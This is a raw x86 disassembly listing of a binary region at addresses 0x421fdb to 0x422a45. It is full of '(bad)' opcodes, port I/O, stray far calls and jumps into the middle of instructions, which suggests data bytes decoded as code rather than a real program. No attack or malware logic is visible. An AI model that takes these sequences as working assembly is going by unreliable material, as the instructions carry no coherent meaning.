  421fdb:	ins    BYTE PTR es:[edi],dx
  421fdc:	in     eax,0xb9
  421fde:	sbb    BYTE PTR [esi],ch
  421fe0:	ins    DWORD PTR es:[edi],dx
  421fe1:	and    ebx,esi
  421fe3:	(bad)  
  421fe4:	das    
  421fe5:	lods   al,BYTE PTR ds:[esi]
  421fe6:	ret    
  421fe7:	movnti DWORD PTR [edx],edi
  421fea:	(bad)  
  421feb:	retf   0xc1a2
	...
  422056:	imul   eax,DWORD PTR [esi],0xffffff8f
  422059:	dec    edi
  42205a:	out    dx,eax
  42205b:	iret   
  42205c:	jmp    0x422084
  42205e:	aas    
  42205f:	in     eax,dx
  422060:	push   es
  422061:	mov    bp,0xc8e2
  422065:	mov    dh,0x67
  422067:	ins    DWORD PTR es:[edi],dx
  422068:	add    DWORD PTR [eax],eax
  42206a:	add    BYTE PTR [ecx],al
  42206c:	add    BYTE PTR [eax],al
  42206e:	mov    esi,0x2f0565f8
  422073:	ficomp WORD PTR [ebx]
  422075:	arpl   WORD PTR [ebp-0x28],dx
  422078:	cmp    BYTE PTR [edi+0x24],ah
  42207b:	scas   al,BYTE PTR es:[edi]
  42207c:	dec    ebx
  42207d:	push   0xffffff86
  42207f:	enter  0x22ae,0x0
  422083:	adc    al,0xa
  422085:	call   0xf106:0xfb8906ee
  42208c:	jge    0x422049
  42208e:	push   edi
  42208f:	mov    dh,ch
  422091:	stos   DWORD PTR es:[edi],eax
  422092:	cmp    al,BYTE PTR [edi+0x1a]
  422095:	pushf  
  422096:	inc    edx
  422097:	(bad)  
  422098:	in     al,dx
  422099:	sahf   
  42209a:	lock adc bl,BYTE PTR [edi]
  42209d:	ret    0xc9a2
  4220a0:	loope  0x422107
  4220a2:	push   ebp
  4220a3:	mov    esp,0x6613af10
  4220a8:	(bad)  
  4220a9:	int3   
  4220aa:	sub    ebp,DWORD PTR [ebx-0x4e]
  4220ad:	dec    ebx
  4220ae:	cmp    eax,0xed10fe89
  4220b3:	inc    edx
  4220b4:	ss sti 
  4220b6:	mov    ebp,0xe19b5dc6
  4220bb:	or     ah,bh
  4220bd:	stc    
  4220be:	outs   dx,DWORD PTR ds:[esi]
  4220bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220c0:	sub    ebp,0xfea74d4b
  4220c6:	adc    esp,DWORD PTR [ecx+ecx*8]
  4220c9:	cmp    ecx,edi
  4220cb:	sbb    BYTE PTR [edx+0x5dfa24df],dh
  4220d1:	mov    al,0x31
  4220d3:	test   eax,0x944acd2d
  4220d8:	sub    DWORD PTR fs:[esi],esi
  4220db:	(bad)  
  4220dc:	fild   DWORD PTR [ecx+0x5d4816a7]
  4220e2:	mov    ah,0x30
  4220e4:	mov    cl,BYTE PTR [eax]
  4220e6:	dec    ecx
  4220e7:	dec    esi
  4220e8:	mov    al,0x9f
  4220ea:	sbb    eax,0xfe2bd669
  4220ef:	mov    ah,0x15
  4220f1:	add    bl,BYTE PTR [edx-0x5cd6c776]
  4220f7:	jnp    0x422164
  4220f9:	ss cwde 
  4220fb:	sti    
  4220fc:	mov    ebx,0x7208cf86
  422101:	xor    al,0x7a
  422103:	push   cs
  422104:	repnz mov edi,0xc81f9383
  42210a:	popf   
  42210b:	out    dx,eax
  42210c:	sub    BYTE PTR [ebx-0x1e],ch
  42210f:	outs   dx,BYTE PTR ds:[esi]
  422110:	mov    dh,0x7c
  422112:	dec    ebx
  422113:	mov    bh,0xc5
  422115:	mov    ds:0x6c95d87,al
  42211a:	adc    DWORD PTR [ebp-0x791bde5d],ebp
  422120:	lea    ebp,[ebx+ecx*2+0x79]
  422124:	inc    ecx
  422125:	lods   al,BYTE PTR ds:[esi]
  422126:	inc    esi
  422127:	add    bl,BYTE PTR [edi+eax*8]
  42212a:	fsubr  st,st(1)
  42212c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42212d:	pop    esp
  42212e:	add    al,0x69
  422130:	stos   BYTE PTR es:[edi],al
  422131:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422132:	xor    DWORD PTR [ebp-0x37],0xffffffaa
  422136:	inc    ecx
  422137:	mov    esi,0x2b26ac19
  42213c:	sub    ah,BYTE PTR [ebp+ecx*2-0x2]
  422140:	test   al,0x9e
  422142:	cwde   
  422143:	call   0x586d:0xed809fd4
  42214a:	mov    dh,0xe3
  42214c:	outs   dx,DWORD PTR ds:[esi]
  42214d:	jne    0x422109
  42214f:	xchg   BYTE PTR [esi-0x12],ch
  422152:	aad    0x2b
  422154:	mulps  xmm7,xmm3
  422157:	int3   
  422158:	fsubrp st(6),st
  42215a:	dec    esp
  42215b:	mov    ebp,ebx
  42215d:	mov    ?,edx
  42215f:	je     0x42215c
  422161:	xchg   ch,al
  422163:	scas   eax,DWORD PTR es:[edi]
  422164:	xor    DWORD PTR [ebx+0x27],ecx
  422167:	sar    DWORD PTR [eax],0x55
  42216a:	cmp    eax,0xffffffaa
  42216d:	lahf   
	...
  4221d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221d7:	push   edx
  4221d8:	jnp    0x4221d7
  4221da:	(bad)  
  4221db:	std    
  4221dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221dd:	pop    ebx
  4221de:	dec    edx
  4221df:	sub    al,0x42
  4221e1:	sub    esi,DWORD PTR [esi+0x672450e3]
  4221e7:	outs   dx,BYTE PTR ds:[esi]
  4221e8:	add    DWORD PTR [eax],eax
  4221ea:	add    BYTE PTR [ecx],al
  4221ec:	add    BYTE PTR [eax],al
  4221ee:	add    eax,0x5a83e81e
  4221f3:	(bad)  
  4221f4:	stc    
  4221f5:	xor    al,0xee
  4221f7:	jne    0x422276
  4221f9:	sbb    BYTE PTR [esi+0x44],0x49
  4221fd:	lea    esi,[ecx-0x1a]
  422200:	cmp    eax,0x98e1c4ce
  422205:	cmp    al,0x3b
  422207:	lds    ebx,FWORD PTR [eax+0x2a3acf8a]
  42220d:	test   al,0x3b
  42220f:	mov    gs,ecx
  422211:	xor    edx,DWORD PTR [eax+0x3129fe77]
  422217:	mov    cl,0x17
  422219:	clc    
  42221a:	cmp    eax,0x99b32435
  42221f:	mov    cs,WORD PTR [ecx-0x4a]
  422222:	in     eax,0x70
  422224:	jg     0x422284
  422226:	mov    ebp,ecx
  422228:	shr    BYTE PTR [edx+edx*1],cl
  42222b:	jne    0x42221a
  42222d:	xor    DWORD PTR [ebx+0x5c],edx
  422230:	loope  0x422214
  422232:	xchg   edx,eax
  422233:	shr    DWORD PTR [edx],cl
  422235:	ror    edx,1
  422237:	std    
  422238:	and    al,0x34
  42223a:	push   ebx
  42223b:	ret    
  42223c:	addr16 inc edi
  42223e:	xchg   edi,eax
  42223f:	repz dec eax
  422241:	sbb    bl,BYTE PTR [edx]
  422243:	(bad)  
  422244:	std    
  422245:	push   edi
  422246:	out    dx,al
  422247:	or     cl,dl
  422249:	aam    0x58
  42224b:	add    BYTE PTR [esi+0x3c],bh
  42224e:	adc    esi,DWORD PTR [edi]
  422250:	adc    eax,0x5853c8ea
  422255:	fnstenv [ebp+0x18953bd5]
  42225b:	js     0x4222af
  42225d:	cdq    
  42225e:	into   
  42225f:	popf   
  422260:	jp     0x422295
  422262:	(bad)  
  422263:	mov    edi,0x3d892618
  422268:	out    0xbc,eax
  42226a:	rol    BYTE PTR [esi*2+0x527c6306],cl
  422271:	jmp    0x768c:0x3597e96f
  422278:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422279:	push   eax
  42227a:	lahf   
  42227b:	cmp    dh,BYTE PTR [eax-0x9]
  42227e:	mov    bl,0x70
  422280:	pusha  
  422281:	int3   
  422282:	test   eax,0x56a4e137
  422287:	daa    
  422288:	inc    edi
  422289:	sbb    al,0xf2
  42228b:	jmp    0x422232
  42228d:	xchg   ebx,eax
  42228e:	jns    0x4222b0
  422290:	enter  0x275,0x89
  422294:	xchg   ebx,eax
  422295:	call   0x8a4419df
  42229a:	adc    BYTE PTR [edx+0x3ca103fa],al
  4222a0:	and    dl,al
  4222a2:	lahf   
  4222a3:	sub    bl,BYTE PTR [ebp-0x36]
  4222a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222a7:	or     DWORD PTR [esi+0x43fc6e3a],edx
  4222ad:	ins    BYTE PTR es:[edi],dx
  4222ae:	enter  0xc7a8,0x37
  4222b2:	pushf  
  4222b3:	in     eax,dx
  4222b4:	jns    0x422249
  4222b6:	or     esi,DWORD PTR [ebx]
  4222b8:	cmp    BYTE PTR [edx],cl
  4222ba:	inc    edi
  4222bb:	out    dx,eax
  4222bc:	in     al,dx
  4222bd:	xchg   DWORD PTR [eax-0x27],ebp
  4222c0:	lds    eax,FWORD PTR [edx+0x27]
  4222c3:	jnp    0x422297
  4222c5:	out    dx,eax
  4222c6:	mov    dl,0xaa
  4222c8:	xchg   edi,eax
  4222c9:	scas   eax,DWORD PTR es:[edi]
  4222ca:	enter  0x8df3,0x66
  4222ce:	cmp    al,BYTE PTR [eax+edx*1]
  4222d1:	aas    
  4222d2:	mov    al,ds:0x2892d27b
  4222d7:	push   es
  4222d8:	adc    esi,DWORD PTR [edx*4+0x150e7bfa]
  4222df:	and    BYTE PTR [esi],ch
  4222e1:	add    BYTE PTR [eax+0x206c73b5],ah
  4222e7:	add    edi,DWORD PTR [esp+ebx*1]
  4222ea:	adc    edi,DWORD PTR [edi]
  4222ec:	cli    
  4222ed:	adc    al,BYTE PTR [eax]
	...
  422353:	add    BYTE PTR [eax],al
  422355:	add    BYTE PTR [edi-0x10085213],cl
  42235b:	neg    edi
  42235d:	std    
  42235e:	sub    ebx,DWORD PTR [ebp+0x71]
  422361:	dec    ecx
  422362:	mov    BYTE PTR [ecx-0x36],ch
  422365:	dec    ecx
  422366:	outs   dx,DWORD PTR ds:[si]
  422368:	add    DWORD PTR [eax],eax
  42236a:	add    BYTE PTR [ecx],al
  42236c:	add    BYTE PTR [eax],al
  42236e:	sbb    BYTE PTR [ebx],ah
  422370:	lock push edi
  422372:	vpgatherqd xmm2,DWORD PTR ds:0x258f8da9,xmm7
  42237b:	shl    BYTE PTR [ebp-0x5ba589f6],cl
  422381:	icebp  
  422382:	xor    bl,BYTE PTR [esi]
  422384:	dec    ecx
  422385:	mov    BYTE PTR [ebx-0x41],al
  422388:	or     BYTE PTR [ebp-0x12],bl
  42238b:	repz jne 0x422351
  42238e:	pop    ebp
  42238f:	sbb    dh,bh
  422391:	mov    ebx,0xab8e47d5
  422396:	repnz test eax,0x878535f0
  42239c:	mov    edi,0x257181b9
  4223a1:	pushf  
  4223a2:	cmp    eax,0xb024efd5
  4223a7:	out    0xee,eax
  4223a9:	shr    DWORD PTR [ecx],cl
  4223ab:	nop
  4223ac:	lods   al,BYTE PTR ds:[esi]
  4223ad:	cmp    eax,0xd632500b
  4223b2:	cmc    
  4223b3:	lods   al,BYTE PTR ds:[esi]
  4223b4:	nop
  4223b5:	jecxz  0x422403
  4223b7:	fs push esi
  4223b9:	out    0x12,eax
  4223bb:	add    eax,ebx
  4223bd:	loopne 0x422380
  4223bf:	and    DWORD PTR [edi+ebp*4+0xc],0xffffffc5
  4223c4:	xchg   edi,eax
  4223c5:	xchg   DWORD PTR [ebp+0x38164dc0],edx
  4223cb:	push   ds
  4223cc:	aaa    
  4223cd:	aad    0x5d
  4223cf:	lea    esp,[edx-0x579c318d]
  4223d5:	ins    BYTE PTR es:[edi],dx
  4223d6:	push   esp
  4223d7:	fwait
  4223d8:	out    dx,eax
  4223d9:	test   al,0xbe
  4223db:	retf   0xbe28
  4223de:	or     DWORD PTR [edx],eax
  4223e0:	inc    edx
  4223e1:	jg     0x422436
  4223e3:	push   esi
  4223e4:	sub    eax,0x84d2ea8c
  4223e9:	xor    eax,DWORD PTR [esi+0x73]
  4223ec:	pop    eax
  4223ed:	outs   dx,DWORD PTR ds:[esi]
  4223ee:	cmp    ebx,DWORD PTR [eax]
  4223f0:	or     DWORD PTR [ecx+0x20],ebx
  4223f3:	(bad)  
  4223f4:	fstp   st(4)
  4223f6:	ins    DWORD PTR es:[edi],dx
  4223f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223f8:	jnp    0x422437
  4223fa:	xchg   esi,eax
  4223fb:	jb     0x42241d
  4223fd:	mov    cl,0x4a
  4223ff:	fwait
  422400:	pop    ebx
  422401:	popa   
  422402:	sti    
  422403:	loope  0x42239f
  422405:	mov    ebx,DWORD PTR [edi+0x5336b0d1]
  42240b:	out    0x4e,eax
  42240d:	inc    ebp
  42240e:	cmp    ebp,DWORD PTR ds:0x2e359052
  422414:	outs   dx,DWORD PTR ds:[esi]
  422415:	cmp    BYTE PTR [edi],ah
  422417:	arpl   WORD PTR [edx-0x55],dx
  42241a:	sti    
  42241b:	popa   
  42241c:	or     BYTE PTR cs:[edi-0x304f2bde],al
  422423:	or     al,0xfe
  422425:	test   BYTE PTR [edx],ch
  422427:	xor    DWORD PTR [ebx],0x482b665b
  42242d:	or     ah,BYTE PTR [esi-0x37dbbf02]
  422433:	lods   al,BYTE PTR gs:[esi]
  422435:	addr16 mov edx,0xf744437f
  42243b:	fisubr DWORD PTR [eax+0x2153ace4]
  422441:	or     BYTE PTR [esi+esi*1+0x6f87e0c5],dh
  422448:	and    BYTE PTR ds:0xff232a3e,dl
  42244e:	add    edx,DWORD PTR [bp+di]
  422451:	xor    ecx,edi
  422453:	fs je  0x4224ba
  422456:	and    ah,BYTE PTR [eax+0x62]
  422459:	push   0xf181e05
  42245e:	(bad)  
  42245f:	out    0x77,eax
  422461:	cmp    eax,0xb30f928b
  422466:	fucomp st(7)
  422468:	jge    0x422401
  42246a:	retf   
  42246b:	loopne 0x42241d
  42246d:	pop    ss
	...
  4224d6:	push   edx
  4224d7:	sub    BYTE PTR [esi],0x69
  4224da:	(bad)  
  4224db:	in     eax,dx
  4224dc:	push   edi
  4224dd:	mov    ebx,0x99e531bb
  4224e2:	rcr    ah,cl
  4224e4:	sbb    al,0x14
  4224e6:	addr16 jo 0x4224ea
  4224e9:	add    BYTE PTR [eax],al
  4224eb:	add    DWORD PTR [eax],eax
  4224ed:	add    BYTE PTR [edx-0x73],ch
  4224f0:	sub    bl,al
  4224f2:	aaa    
  4224f3:	mov    ch,0x45
  4224f5:	nop
  4224f6:	fwait
  4224f7:	adc    bh,BYTE PTR [ecx+0x6228f358]
  4224fd:	daa    
  4224fe:	push   ss
  4224ff:	(bad)
  422503:	das    
  422504:	inc    eax
  422505:	repz xchg ebp,eax
  422507:	jg     0x42249c
  422509:	sbb    DWORD PTR [edi+0x2d],edx
  42250c:	jne    0x4224cc
  42250e:	repz mov ds:0x96a808be,al
  422514:	push   cs
  422515:	xor    ch,dh
  422517:	imul   edi,eax,0xffffffd8
  42251a:	call   FWORD PTR [eax+edi*8]
  42251d:	mov    bl,0xd3
  42251f:	icebp  
  422520:	xchg   ebp,eax
  422521:	(bad)  
  422522:	scas   al,BYTE PTR es:[edi]
  422523:	rcl    DWORD PTR [eax+ecx*8+0x34fd5a05],1
  42252a:	mov    esp,0xb84d127c
  42252f:	rcr    esp,1
  422531:	ret    0x6ff7
  422534:	dec    ecx
  422535:	jae    0x4224c8
  422537:	inc    eax
  422538:	out    dx,eax
  422539:	(bad)  
  42253a:	cmc    
  42253b:	aas    
  42253c:	les    esp,FWORD PTR [edi-0x39cc36b3]
  422542:	imul   ebp,esp,0x7e56c5a7
  422548:	adc    ch,BYTE PTR [ebx]
  42254a:	(bad)  
  42254b:	ins    DWORD PTR es:[edi],dx
  42254c:	gs daa 
  42254e:	pop    ebp
  42254f:	mov    DWORD PTR [edx],esi
  422551:	test   al,0x84
  422553:	mov    esp,0x514dafcb
  422558:	cdq    
  422559:	sahf   
  42255a:	dec    eax
  42255b:	xchg   ebx,eax
  42255c:	dec    edi
  42255d:	xor    BYTE PTR ds:0xaf214f4e,dl
  422563:	adc    BYTE PTR [edx-0x227a6d24],bh
  422569:	jmp    0x4224ef
  42256b:	adc    edi,edi
  42256d:	jmp    0x1695:0x77effb9e
  422574:	jmp    0xb2f3c506
  422579:	es sub eax,0xcc5e9488
  42257f:	in     al,0x80
  422581:	push   esi
  422582:	repz mov WORD PTR [ebp-0x1e],?
  422586:	xor    DWORD PTR [edx],ebp
  422588:	out    0x8c,al
  42258a:	xlat   BYTE PTR ds:[ebx]
  42258b:	jge    0x42251a
  42258d:	outs   dx,BYTE PTR ds:[esi]
  42258e:	nop
  42258f:	jne    0x4225e6
  422591:	(bad)  
  422592:	imul   esi,DWORD PTR [edx],0xfffffffc
  422595:	fwait
  422596:	push   cs
  422597:	nop
  422598:	jmp    0x42256f
  42259a:	add    bl,BYTE PTR [ebp+0x64e64173]
  4225a0:	pop    edx
  4225a1:	mov    bl,0xe9
  4225a3:	push   ebx
  4225a4:	mov    ah,0xfb
  4225a6:	jl     0xa7f639ef
  4225ac:	add    DWORD PTR [esi+0x2e],ecx
  4225af:	jg     0x4225fd
  4225b1:	fstp   QWORD PTR [edi-0x60298ad6]
  4225b7:	(bad)  
  4225b8:	xor    DWORD PTR ds:[ebx],0xffffffce
  4225bc:	dec    eax
  4225bd:	cld    
  4225be:	iret   
  4225bf:	inc    esi
  4225c0:	test   eax,0x7a8052cb
  4225c5:	in     eax,0xe9
  4225c7:	and    eax,0xd03be605
  4225cc:	dec    ebx
  4225cd:	sub    al,0x93
  4225cf:	ss cmp ebp,ecx
  4225d2:	push   cs
  4225d3:	(bad)  
  4225d4:	arpl   WORD PTR [edx-0x17439af6],ax
  4225da:	cmp    dh,BYTE PTR [edi+0x21dc6801]
  4225e0:	or     ebp,edi
  4225e2:	into   
  4225e3:	adc    ch,al
  4225e5:	cld    
  4225e6:	mov    eax,ds:0x4658de9e
  4225eb:	inc    esp
  4225ec:	adc    bh,ch
	...
  422656:	call   0xfa77:0xbf778fae
  42265d:	out    dx,eax
  42265e:	sbb    esi,DWORD PTR [ecx+0x6ca7a2f8]
  422664:	push   eax
  422665:	inc    ecx
  422666:	addr16 jno 0x42266a
  422669:	add    BYTE PTR [eax],al
  42266b:	add    DWORD PTR [eax],eax
  42266d:	add    BYTE PTR [edi+0x22],ch
  422670:	sub    BYTE PTR [eax],cl
  422672:	xchg   ebx,eax
  422673:	push   eax
  422674:	push   es
  422675:	ja     0x4226d9
  422677:	jae    0x422627
  422679:	aaa    
  42267a:	sbb    BYTE PTR [edi+0x1423ee30],dh
  422680:	sub    DWORD PTR [edx+ebx*8-0x2],0xb24e144d
  422688:	jg     0x4226e0
  42268a:	stos   BYTE PTR es:[edi],al
  42268b:	or     ecx,DWORD PTR [edi+ebx*8+0x63e0beba]
  422692:	nop    DWORD PTR [eax]
  422695:	clc    
  422696:	adc    al,0x7e
  422698:	gs jo  0x4226ce
  42269b:	inc    edi
  42269c:	sbb    al,0x1e
  42269e:	dec    DWORD PTR [ecx-0x1c3c9e10]
  4226a4:	cmpxchg DWORD PTR [edx],edi
  4226a7:	mov    ebp,0xa80ae257
  4226ac:	int    0x8
  4226ae:	ret    0x1c20
  4226b1:	repz pop ss
  4226b3:	test   DWORD PTR [ebx+0x4d6df00b],esp
  4226b9:	xchg   ebp,eax
  4226ba:	or     eax,0x6d726de0
  4226bf:	imul   ah
  4226c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226c2:	fld    TBYTE PTR [edi+ebp*1+0x2b]
  4226c7:	push   0x1bd5fca5
  4226cc:	jg     0x422670
  4226ce:	sti    
  4226cf:	adc    al,0x72
  4226d1:	fcomp  st(6)
  4226d3:	pop    edx
  4226d4:	xor    ch,BYTE PTR [esi]
  4226d6:	into   
  4226d7:	test   DWORD PTR [esi+esi*8-0x2f6da1c1],0x6cca1bc9
  4226e2:	inc    edx
  4226e3:	adc    esi,DWORD PTR [esi]
  4226e5:	lds    esp,FWORD PTR [eax+0x51398ebb]
  4226eb:	mov    ecx,0x2b03426e
  4226f0:	sti    
  4226f1:	mov    BYTE PTR [ebx],bh
  4226f3:	dec    edi
  4226f4:	adc    eax,0x912b26aa
  4226f9:	jl     0x422703
  4226fb:	xchg   edi,eax
  4226fc:	and    al,0x15
  4226fe:	retf   0xc250
  422701:	scas   al,BYTE PTR es:[edi]
  422702:	dec    ecx
  422703:	xchg   ebp,eax
  422704:	push   edx
  422705:	xchg   esi,eax
  422706:	dec    esi
  422707:	sahf   
  422708:	fistp  DWORD PTR [ecx+0x63]
  42270b:	fsubr  DWORD PTR [eax+0x6c2eb6c6]
  422711:	(bad)  
  422712:	sbb    dl,bh
  422714:	lea    esi,ds:0xba1828af
  42271a:	add    eax,0x8deef8f7
  42271f:	add    BYTE PTR [edi+0x70],dh
  422722:	(bad)  
  422724:	ret    
  422725:	aaa    
  422726:	dec    eax
  422727:	rcl    DWORD PTR [ebx+0xc],cl
  42272a:	hlt    
  42272b:	icebp  
  42272c:	scas   eax,DWORD PTR es:[edi]
  42272d:	mov    ds:0xbbe90a91,al
  422732:	int3   
  422733:	jne    0x42272f
  422735:	mov    esi,0xcf25408e
  42273a:	dec    edx
  42273b:	scas   al,BYTE PTR es:[di]
  42273d:	xchg   ax,ax
  42273f:	test   DWORD PTR [ebp-0x75ce03a4],esi
  422745:	aad    0xbf
  422747:	mov    dl,0x5e
  422749:	xlat   BYTE PTR ds:[ebx]
  42274a:	ror    BYTE PTR [edx-0x6],1
  42274d:	scas   al,BYTE PTR es:[edi]
  42274e:	xor    BYTE PTR es:[edx],ah
  422751:	xor    BYTE PTR [eax+ebx*1-0x45],bl
  422755:	cmp    al,0x56
  422757:	(bad)  
  422758:	mov    cs,ecx
  42275a:	sub    DWORD PTR [edi+ecx*2],ebp
  42275d:	push   esi
  42275e:	in     eax,dx
  42275f:	push   edx
  422760:	loop   0x422720
  422762:	dec    DWORD PTR [esi+0x312ff2ed]
  422768:	xchg   ah,cl
  42276a:	leave  
  42276b:	pop    ebx
  42276c:	pop    esp
  42276d:	jne    0x42276f
	...
  4227d3:	add    BYTE PTR [eax],al
  4227d5:	add    BYTE PTR [edi],ah
  4227d7:	sub    eax,0x7d7f2d7d
  4227dc:	ja     0x42280d
  4227de:	mov    esi,0x587f01c8
  4227e3:	call   0x72a92925
  4227e8:	add    DWORD PTR [eax],eax
  4227ea:	add    BYTE PTR [ecx],al
  4227ec:	add    BYTE PTR [eax],al
  4227ee:	push   esp
  4227ef:	aam    0xaf
  4227f1:	fsubr  DWORD PTR [ebx]
  4227f3:	push   edx
  4227f4:	jge    0x42285b
  4227f6:	hlt    
  4227f7:	cli    
  4227f8:	adc    ecx,edx
  4227fa:	sbb    BYTE PTR [ebx+0x57],bl
  4227fd:	in     eax,dx
  4227fe:	xchg   ecx,eax
  4227ff:	ror    BYTE PTR [edi+0x59],0x2d
  422803:	pop    ss
  422804:	and    DWORD PTR [ebx+ebp*4-0x16cba41b],ebp
  42280b:	es arpl bx,sp
  42280e:	pop    edx
  42280f:	fild   DWORD PTR [eax]
  422811:	jmp    0x11520930
  422816:	add    DWORD PTR [esi-0x13ff977a],esp
  42281c:	jno    0x4227e5
  42281e:	out    dx,eax
  42281f:	aaa    
  422820:	sbb    al,0x3f
  422822:	and    dh,bh
  422824:	mov    eax,0x4ec7cd9a
  422829:	cmp    cl,BYTE PTR [eax+ebp*2-0x1f718376]
  422830:	addr16 retf 
  422832:	lods   eax,DWORD PTR ds:[esi]
  422833:	jbe    0x422892
  422835:	sti    
  422836:	jne    0x42287d
  422838:	dec    ebx
  422839:	xchg   edx,eax
  42283a:	push   esp
  42283b:	xlat   BYTE PTR ds:[ebx]
  42283c:	dec    edx
  42283d:	push   ss
  42283e:	mov    ebp,0xaf47304b
  422843:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422844:	xor    eax,0xa7b18a23
  422849:	pop    edx
  42284a:	in     eax,dx
  42284b:	outs   dx,BYTE PTR ds:[esi]
  42284c:	dec    ecx
  42284d:	cmp    bh,BYTE PTR [ecx+0x3224b9e3]
  422853:	rcr    ch,0xae
  422856:	adc    eax,0x8b96ad2e
  42285b:	test   eax,ebx
  42285d:	fild   DWORD PTR ds:0xff4d64cd
  422863:	call   0xe166:0xca6abcf3
  42286a:	fwait
  42286b:	scas   eax,DWORD PTR es:[edi]
  42286c:	int    0x5f
  42286e:	shr    DWORD PTR [edx+0x41],0x1d
  422872:	aas    
  422873:	lahf   
  422874:	sbb    al,0x5c
  422876:	mov    eax,0x93b7c60a
  42287b:	mov    ah,0xe2
  42287d:	cwde   
  42287e:	out    0x83,eax
  422880:	add    al,0x79
  422882:	out    0x8b,al
  422884:	lock aad 0xf4
  422887:	xchg   esi,eax
  422888:	pop    ebp
  422889:	cwde   
  42288a:	jnp    0x422818
  42288c:	fsubr  st(3),st
  42288e:	cmp    edx,DWORD PTR [ecx]
  422890:	fisubr DWORD PTR [ecx+0x77ae38c7]
  422896:	gs mov edx,0xeac1527c
  42289c:	fisubr WORD PTR [esi-0x3dda7b4c]
  4228a2:	push   0x72c14f88
  4228a7:	push   esp
  4228a8:	enter  0x523,0x30
  4228ac:	data16 outs dx,BYTE PTR ds:[esi]
  4228ae:	ja     0x4228a2
  4228b0:	sahf   
  4228b1:	cld    
  4228b2:	add    al,0xbb
  4228b4:	stos   DWORD PTR es:[edi],eax
  4228b5:	push   ds
  4228b6:	mov    edi,0xc5f486a4
  4228bb:	scas   al,BYTE PTR es:[edi]
  4228bc:	mov    DWORD PTR [esi-0x2f627c9e],eax
  4228c2:	pop    ecx
  4228c3:	loop   0x422885
  4228c5:	dec    esi
  4228c6:	retf   0xd713
  4228c9:	ror    DWORD PTR [ebp-0x391d83f4],1
  4228cf:	faddp  st(5),st
  4228d1:	mov    al,0x76
  4228d3:	out    0x9a,eax
  4228d5:	jb     0x4228b2
  4228d7:	call   0x5048:0xa9a58ebd
  4228de:	test   eax,0x383bbe9b
  4228e3:	mov    ebx,0x663c96a4
  4228e8:	sub    DWORD PTR [ecx+0x7a9a891f],0x0
	...
  422956:	int    0x39
  422958:	mov    eax,0xef97fc97
  42295d:	jnp    0x42291d
  42295f:	outs   dx,DWORD PTR ds:[esi]
  422960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422961:	loopne 0x4229c5
  422963:	and    DWORD PTR [eax+0x17367c1],edx
  422969:	add    BYTE PTR [eax],al
  42296b:	add    DWORD PTR [eax],eax
  42296d:	add    BYTE PTR [edx-0x68],dl
  422970:	and    BYTE PTR [ebp+0xad9eeaa],bl
  422976:	or     bl,BYTE PTR [ebx+ebp*1]
  422979:	or     ch,BYTE PTR [eax]
  42297b:	loopne 0x4229a8
  42297d:	lahf   
  42297e:	jae    0x4229f9
  422980:	repz inc DWORD PTR ds:0xd9bd
  422986:	out    0x5f,al
  422988:	arpl   di,bx
  42298a:	ret    
  42298b:	out    dx,eax
  42298c:	adc    eax,0x4c77d7f0
  422991:	imul   edi,esi,0xffffffcb
  422994:	js     0x4229db
  422996:	inc    ecx
  422997:	mov    edx,0xb68f9b99
  42299c:	add    edx,ebp
  42299e:	in     al,0x9d
  4229a0:	loope  0x4229b3
  4229a2:	loopne 0x422a03
  4229a4:	pop    esp
  4229a5:	inc    esp
  4229a6:	lea    edi,[ebp+0x9]
  4229a9:	fiadd  WORD PTR [ecx+esi*1]
  4229ac:	lods   al,BYTE PTR ds:[esi]
  4229ad:	cwde   
  4229ae:	push   0x68
  4229b0:	or     eax,0x1087e3cb
  4229b5:	dec    ebp
  4229b6:	cdq    
  4229b7:	cdq    
  4229b8:	or     BYTE PTR [ecx],0x5c
  4229bb:	inc    edx
  4229bc:	xor    bh,BYTE PTR [eax]
  4229be:	jecxz  0x422a39
  4229c0:	cdq    
  4229c1:	cmc    
  4229c2:	pop    edx
  4229c3:	adc    eax,0xc0d33c6
  4229c8:	sbb    BYTE PTR [ecx],0x1c
  4229cb:	add    DWORD PTR [esi-0x1b],ebp
  4229ce:	scas   eax,DWORD PTR es:[edi]
  4229cf:	sti    
  4229d0:	sbb    ebx,ecx
  4229d2:	lods   eax,DWORD PTR ds:[esi]
  4229d3:	fldcw  WORD PTR [edi]
  4229d5:	cmp    esp,DWORD PTR cs:[esp+ecx*2+0x6bdd575f]
  4229dd:	les    ebx,FWORD PTR [ebx-0x57]
  4229e0:	sbb    DWORD PTR [eax-0x1],esi
  4229e3:	cld    
  4229e4:	fstp   QWORD PTR [eax+0x68b18fc6]
  4229ea:	scas   eax,DWORD PTR es:[edi]
  4229eb:	add    ah,ah
  4229ed:	xlat   BYTE PTR ds:[ebx]
  4229ee:	mov    al,BYTE PTR [edi+0x1004493f]
  4229f4:	cmp    BYTE PTR [eax-0x73],0xe9
  4229f8:	test   DWORD PTR [edx+0x33a593fa],ebp
  4229fe:	jle    0x422a7a
  422a00:	scas   al,BYTE PTR es:[edi]
  422a01:	xchg   BYTE PTR [edx-0x7c43ac69],ah
  422a07:	jbe    0x422997
  422a09:	and    edi,0xffffffbf
  422a0c:	lock test DWORD PTR [edi],ecx
  422a0f:	fdivr  st,st(6)
  422a11:	sbb    BYTE PTR [edi+0x33],dh
  422a14:	and    BYTE PTR [esi+0x5a6bccc6],al
  422a1a:	std    
  422a1b:	jbe    0x4229be
  422a1d:	pop    eax
  422a1e:	push   ecx
  422a1f:	test   DWORD PTR [eax-0xd4a59ef],0x2a3cd292
  422a29:	push   edi
  422a2a:	push   edi
  422a2b:	rol    edi,0xce
  422a2e:	adc    BYTE PTR [esi+0x6f],ch
  422a31:	stos   DWORD PTR es:[edi],eax
  422a32:	cld    
  422a33:	xor    BYTE PTR [ebp+0x50970728],0x50
  422a3a:	fs aaa 
  422a3c:	loope  0x422a26
  422a3e:	cmp    eax,0xc6359099
  422a43:	mov    bh,0xa
  422a45:	xchg   ecx,eax
